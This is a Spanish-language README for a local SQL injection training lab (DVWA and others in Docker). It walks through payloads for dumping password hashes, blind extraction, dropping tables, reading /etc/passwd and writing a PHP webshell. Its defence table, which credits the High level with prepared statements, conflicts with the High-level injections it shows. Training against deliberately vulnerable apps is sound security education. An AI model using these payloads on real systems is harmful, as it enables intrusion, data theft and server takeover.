# SQL Injection Lab

## Labs disponibles

| Servicio    | URL                                    | Credenciales                  |
|-------------|----------------------------------------|-------------------------------|
| DVWA        | http://localhost:80                    | admin / password              |
| Mutillidae  | http://localhost:8081                  | (sin login requerido)         |
| WebGoat     | http://localhost:8080/WebGoat          | Crear usuario en primer acceso|

## Setup

```bash
# Iniciar todos los labs
docker compose up -d

# DVWA: esperar ~30s, abrir http://localhost → admin / password → "Create / Reset Database"

# Parar los labs
docker compose down

# Parar y eliminar todos los datos
docker compose down -v
```

---

## Taxonomía de ataques SQL Injection

```
SQLi
├── In-band (resultado visible en la respuesta)
│   ├── Error-based       — el error del motor revela datos
│   └── UNION-based       — se añade un SELECT propio a la consulta
├── Blind (no hay salida directa)
│   ├── Boolean-based     — la app responde diferente según true/false
│   └── Time-based        — se mide el tiempo de respuesta (SLEEP/BENCHMARK)
├── Out-of-band           — los datos se exfiltran por DNS/HTTP
└── Técnicas auxiliares
    ├── Stacked queries   — se encadenan varias sentencias (;)
    ├── Second-order      — el payload se almacena y ejecuta después
    └── File R/W          — LOAD_FILE / INTO OUTFILE
```

---

## DVWA

### Security Level: LOW

admin, password

Navegar a **DVWA → SQL Injection** y fijar Security Level en **Low**.

#### 1. Tautología — volcar todos los usuarios
```
1' OR '1'='1
```
La cláusula WHERE se vuelve siempre verdadera → devuelve todos los registros.

#### 2. UNION-based — extraer hashes de contraseñas
```
1' UNION SELECT user,password FROM users#
```
Paso previo obligatorio — descubrir número de columnas:
```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#   ← error: la consulta tiene 2 columnas
```

#### 3. UNION-based — fingerprint del servidor
```
1' UNION SELECT version(),database()#
1' UNION SELECT user(),@@datadir#
```

#### 4. Enumerar bases de datos
```
1' UNION SELECT schema_name,null FROM information_schema.schemata#
```

#### 5. Enumerar tablas
```
1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()#
```

#### 6. Enumerar columnas
```
1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'#
```

#### 7. Error-based — extraer datos vía error de sintaxis
```
1' AND extractvalue(1,concat(0x7e,(SELECT version())))#
1' AND updatexml(1,concat(0x7e,(SELECT user())),1)#
```
MySQL devuelve el resultado dentro del mensaje de error.

#### 8. Boolean-based blind — detectar inyección sin salida visible
```
1' AND 1=1#     ← respuesta normal
1' AND 1=2#     ← respuesta vacía o diferente
```
Extraer datos carácter a carácter:
```
1' AND substring(version(),1,1)='5'#
1' AND ascii(substring((SELECT password FROM users LIMIT 0,1),1,1))>100#
```

#### 9. Time-based blind — cuando no hay diferencia visual
```
1' AND sleep(5)#              ← retraso confirma inyección
1' AND IF(1=1,sleep(5),0)#
1' AND IF(substring(version(),1,1)='5',sleep(3),0)#
```
Extraer contraseña de admin bit a bit:
```
1' AND IF(ascii(substring((SELECT password FROM users WHERE user='admin'),1,1))>100,sleep(3),0)#
```

#### 10. Stacked queries (si el driver lo permite)
```
1'; INSERT INTO users (user,password) VALUES ('hacker','hacked')#
1'; DROP TABLE guestbook#
```

#### 11. File read — leer archivos del servidor
```
1' UNION SELECT load_file('/etc/passwd'),null#
1' UNION SELECT load_file('/var/www/html/dvwa/config/config.inc.php'),null#
```
Requiere privilegio `FILE` y que `secure_file_priv` esté vacío.

#### 12. File write — escribir webshell
```
1' UNION SELECT "<?php system($_GET['cmd']); ?>",null INTO OUTFILE '/var/www/html/shell.php'#
```
Acceso posterior: `http://localhost/shell.php?cmd=id`

---

### Security Level: MEDIUM

El frontend usa un dropdown (evita inyección directa de cadenas).
El backend aplica `mysql_real_escape_string()` — las comillas se escapan.

**Bypass**: payload numérico, sin comillas:
```
1 OR 1=1
1 UNION SELECT user,password FROM users#
1 AND sleep(5)#
```
Interceptar la petición con Burp Suite y modificar el parámetro POST directamente.

---

### Security Level: HIGH

El input está en una página/sesión separada. La consulta añade `LIMIT 1`.

**Bypass**: comentar el LIMIT e iterar el offset:
```
1' UNION SELECT user,password FROM users LIMIT 1,1#
1' UNION SELECT user,password FROM users LIMIT 2,1#
```

---

### Security Level: LOW — SQLi Blind (módulo separado)

DVWA tiene un módulo **SQL Injection (Blind)** específico.

Boolean-based:
```
1' AND 1=1#          ← "User ID exists"
1' AND 1=2#          ← "User ID is MISSING"
1' AND (SELECT count(*) FROM users)>0#
```

Time-based:
```
1' AND sleep(5)#
1' AND IF((SELECT count(*) FROM users)>4,sleep(4),0)#
```

---

### Analysis — cómo cambian las defensas

| Level  | Input        | Escaping                    | Otros controles           |
|--------|-------------|------------------------------|---------------------------|
| Low    | Text field  | Ninguno                      | Ninguno                   |
| Medium | Dropdown    | `mysql_real_escape_string()` | Bloquea comillas simples  |
| High   | Session     | PDO prepared statements      | `LIMIT 1`, token CSRF     |

## Cleanup

```bash
docker compose down -v   # elimina contenedores + volumen de BD
```
